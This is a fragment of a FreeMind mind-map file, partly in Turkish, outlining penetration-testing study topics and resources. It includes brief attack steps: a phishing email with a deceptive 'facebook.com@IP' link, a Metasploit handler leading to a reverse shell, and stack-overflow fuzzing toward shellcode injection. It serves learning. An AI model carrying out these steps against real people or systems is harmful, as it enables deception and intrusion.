<node COLOR="#00b439" CREATED="1439492094074" ID="ID_367189737" MODIFIED="1440061106907" TEXT="ssh">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439492095309" ID="ID_1754332080" MODIFIED="1440061106908" TEXT="scp">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439492096823" ID="ID_1640649014" MODIFIED="1440061106909" TEXT="SimpleHttpServer python">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439492105142" ID="ID_1484262314" MODIFIED="1440061106909" TEXT="python -m SimpleHttpServer 9090">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439492126974" ID="ID_1432172759" MODIFIED="1440061106910" POSITION="left" TEXT="Sosyal M&#xfc;hendislik">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439492137287" ID="ID_710323775" MODIFIED="1440061106911" TEXT="Psikolojik ikna y&#xf6;ntemleri ile yap&#x131;lmas&#x131; isteneni yapt&#x131;rma sanat&#x131;">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439492154285" ID="ID_1270564900" MODIFIED="1440061106912" TEXT="&#xd6;d&#xfc;llendirme">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439492161079" ID="ID_285614746" MODIFIED="1440061106913" TEXT="Bor&#xe7;lu b&#x131;rakma">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439492172474" ID="ID_1229324808" MODIFIED="1440061106913" TEXT="setoolkit">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439492208766" HGAP="25" ID="ID_760670873" MODIFIED="1440061106914" POSITION="left" TEXT="Web a&#xe7;&#x131;kl&#x131;klar&#x131;ndan s&#x131;zma" VSHIFT="37">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439492256826" ID="ID_788554370" MODIFIED="1440061106915" TEXT="exploit/multi/handler ile haz&#x131;rl&#x131;k">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439492293457" ID="ID_407875751" MODIFIED="1440061106916" TEXT="Kar&#x15f;&#x131; tarafa mail ile facebook.com@&lt;IP_KAR&#x15e;ILI&#x11e;I_DEC&#x130;MAL&gt; linki g&#xf6;nderme">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439492327250" ID="ID_155832242" MODIFIED="1440061106916" TEXT="reverse shell alma">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
</node>
<node COLOR="#0033ff" CREATED="1440056635973" ID="ID_1553683805" MODIFIED="1440061106917" POSITION="left" TEXT="Information Security" VSHIFT="19">
<edge COLOR="#0033ff" WIDTH="4"/>
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node COLOR="#00b439" CREATED="1440056641524" ID="ID_317785072" MODIFIED="1440061106918" TEXT="Web Application Security">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440060190664" ID="ID_73565532" LINK="https://www.hackthissite.org/" MODIFIED="1440061106919" TEXT="HackThisSite &#x2013; Good for some basic web based challenges">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060212076" ID="ID_426356021" LINK="http://www.enigmagroup.org/" MODIFIED="1440061106920" TEXT="Enigma Group &#x2013; Similar to Hack this site">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060240325" ID="ID_1263952721" LINK="https://www.owasp.org/index.php/Top_10_2013-Top_10" MODIFIED="1440061106922" TEXT="OWASP Top 10 &#x2013; Idea of what are the most common vulnerabilities">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060268805" ID="ID_1339265704" LINK="http://vulnhub.com/entry/owasp-broken-web-applications-project,46/" MODIFIED="1440061106928" TEXT="OWASP Broken Wep Apps &#x2013; A virtual computer you can &#xa;load up to practice hacking skills on your network">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060301470" ID="ID_767037395" LINK="http://vulnhub.com/entry/pentester-lab-web-for-pentester,71/" MODIFIED="1440061106931" TEXT="Pentesting Lab &#x2013; Another web focused virtual machine">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060320509" ID="ID_1836273863" LINK="http://vulnhub.com/" MODIFIED="1440061106932" TEXT="In fact anything from vulnhub that interested you is good">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060336141" ID="ID_1134542264" LINK="http://www.amazon.com/The-Web-Application-Hackers-Handbook/dp/1118026470" MODIFIED="1440061106935">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      The Web Application Hackers Handbook &#8211;<br />The book on web hacking and vulnerabilities&#160;
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1440056648469" HGAP="26" ID="ID_1169890166" MODIFIED="1440061106936" TEXT="Reverse Engineering" VSHIFT="25">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440060358694" ID="ID_1857637511" LINK="https://tuts4you.com/download.php?list.17" MODIFIED="1440061106942" TEXT="Lena&#x2019;s Tutorials &#x2013; Known as pretty much &#xa;one of the best introductions to reverse engineering">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060370838" ID="ID_1553387918" LINK="http://thelegendofrandom.com/blog/sample-page" MODIFIED="1440061106946">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      The Legends of Random &#8211;<br />Again another solid set of tutorials for reverse engineering
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060472966" ID="ID_1965168556" LINK="http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" MODIFIED="1440061106951" TEXT="Reversing: Secrets of Reverse Engineering &#x2013; &#xa;A good book on the foundation&#x2019;s of reverse engineering">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1440056654716" HGAP="22" ID="ID_41145457" MODIFIED="1440061106954" TEXT="Malware Reverse Engineering" VSHIFT="12">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440060544405" HGAP="34" ID="ID_1671936086" LINK="http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1403515949&amp;sr=1-1&amp;keywords=malware+cookbook" MODIFIED="1440061106956" VSHIFT="-6">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Malware Analysts Cookbook &#8211;<br />Another book focusing on reversing malware&#160;
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060511422" ID="ID_655796702" LINK="http://www.amazon.com/Practical-Malware-Analysis-Hands--Dissecting/dp/1593272901/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1403515878&amp;sr=1-1&amp;keywords=practical+malware+analysis" MODIFIED="1440061106962" TEXT="Practical Malware Analysis &#x2013; &#xa;A great book focusing on reversing malware ">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1440056661244" HGAP="33" ID="ID_294901548" MODIFIED="1440061106964" TEXT="Network Security" VSHIFT="6">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440060667094" ID="ID_223085182" LINK="http://vulnhub.com/" MODIFIED="1440061106970" TEXT="Virtual Machines dominate this category as they&#xa;allow you to practice against real machines. &#xa;Head to vulnhub and download any VM that looks interesting.">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060705006" ID="ID_1452945365" LINK="http://www.offensive-security.com/metasploit-unleashed/Main_Page" MODIFIED="1440061106977" TEXT="Metasploit Unleashed &#x2013; A solid run through of the &#xa;metasploit testing framework to be used in conjunction against VM&#x2019;s.">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060731014" ID="ID_1129157856" LINK="http://www.amazon.com/The-Basics-Hacking-Penetration-Testing/dp/1597496553" MODIFIED="1440061106986" TEXT="The Basics of Hacking and Penetration Testing &#x2013; &#xa;A very basic look at penetration testing useful for&#xa;those completely new to the field.">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060755742" ID="ID_1264107940" LINK="http://www.amazon.com/Metasploit-The-Penetration-Testers-Guide/dp/159327288X" MODIFIED="1440061106993" TEXT="Metasploit &#x2013; The Penetration Testers Guide &#x2013; &#xa;Another book focusing around the use of metasploit in penetration testing">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1440056667701" HGAP="23" ID="ID_668433181" MODIFIED="1440061106996" TEXT="Incident Response" VSHIFT="34">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1440056807663" ID="ID_1988842042" MODIFIED="1440061106996" TEXT="Standards Compliiance">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1440056824045" ID="ID_667503369" MODIFIED="1440061106997" TEXT="Programming / Creating Tools for others">
<edge COLOR="#00b439" WIDTH="2"/>
<node CREATED="1440061521879" ID="ID_499529372" LINK="https://www.google.com.tr/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;ved=0CCwQFjACahUKEwiEw8KBp7fHAhUG1SwKHdj_AHU&amp;url=https%3A%2F%2Fgroups.google.com%2Fgroup%2Fpython-mg%2Fattach%2Fe5728b11878feae5%2FBlack%2520Hat%2520Python%2C%2520Python%2520Programming%2520for%2520Hackers.pdf%3Fpart%3D0.1&amp;ei=GpjVVYTON4aqswHY_4OoBw&amp;usg=AFQjCNE1RIioBRkC7kR1KNoiVRGoNrJa2A&amp;sig2=AY7IkG4_IdBIhBlUoQ93IA&amp;bvm=bv.99804247,d.bGg&amp;cad=rja" MODIFIED="1440061537680" TEXT="Black Hat Python"/>
</node>
<node COLOR="#00b439" CREATED="1440056836644" ID="ID_1805155162" MODIFIED="1440061106998" TEXT="Exploit Development">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440060825566" ID="ID_38552238" LINK="https://www.corelan.be/" MODIFIED="1440061107000" VSHIFT="26">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Corelan &#8211; This is by far the best resource out<br />there for learning about exploit development.&#160;
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060854918" ID="ID_1741368844" LINK="http://fuzzysecurity.com/tutorials.html" MODIFIED="1440061107003">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      FuzzySecurity &#8211; Another good learning
    </p>
    <p>
      resource with some tutorials available
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060889223" ID="ID_456751746" LINK="http://www.exploit-db.com/" MODIFIED="1440061107010" TEXT="Exploit-DB &#x2013; One of the best things you can do&#xa;is find examples of exploits (often with apps attached) &#xa;and try and replicate the exploit independently">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060913223" ID="ID_1460493522" LINK="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441" MODIFIED="1440061107017" TEXT="Hacking &#x2013; The Art of Exploitation &#x2013; A fantastic book &#xa;that covers ton&#x2019;s of different exploitation techniques">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1440060932087" ID="ID_1258704394" LINK="http://www.amazon.com/The-Shellcoders-Handbook-Discovering-Exploiting/dp/047008023X" MODIFIED="1440061107021">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      The Shellcoders Handbook &#8211; Another fantastic<br />book on exploit development and shellcoding
    </p>
  </body>
</html></richcontent>
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491343165" HGAP="17" ID="ID_362157293" MODIFIED="1440063435147" TEXT="Fuzzing" VSHIFT="23">
<edge COLOR="#990000" WIDTH="1"/>
<node COLOR="#111111" CREATED="1439491352438" ID="ID_1719552233" MODIFIED="1440061190810">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Veriyi ne kadar ve nas&#305;l g&#246;nderirsem kar&#351;&#305;<br />tarafta stack'i patlatabilirim sorusunun cevab&#305;d&#305;r.
    </p>
  </body>
</html></richcontent>
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439491420838" ID="ID_8203005" MODIFIED="1440061190811" TEXT="&#xd6;rn. 2700 boyutlu bir dizi i&#xe7;in ruby&apos;de 2700 karakter random patern olu&#x15f;tur">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439491459301" ID="ID_804406837" MODIFIED="1440061190812" TEXT="Paterni kar&#x15f;&#x131;ya g&#xf6;nder">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439491468091" ID="ID_526154780" MODIFIED="1440061190813" TEXT="EIP&apos;ye denk gelen haf&#x131;za adresini bul.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439491521644" ID="ID_784902549" MODIFIED="1440061190813" TEXT="Bundan sonraki return adresine istedi&#x11f;imiz shell code&apos;u ekliyoruz">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439491560940" ID="ID_1992530230" MODIFIED="1440061190814" TEXT="Immunity debugger ile EIP&apos;ye denk gelen adrese bak&#x131;yoruz.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
</node>
<node COLOR="#00b439" CREATED="1440056843430" ID="ID_1218111842" MODIFIED="1440061107022" TEXT="Forensics">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
</node>
</node>
</map>
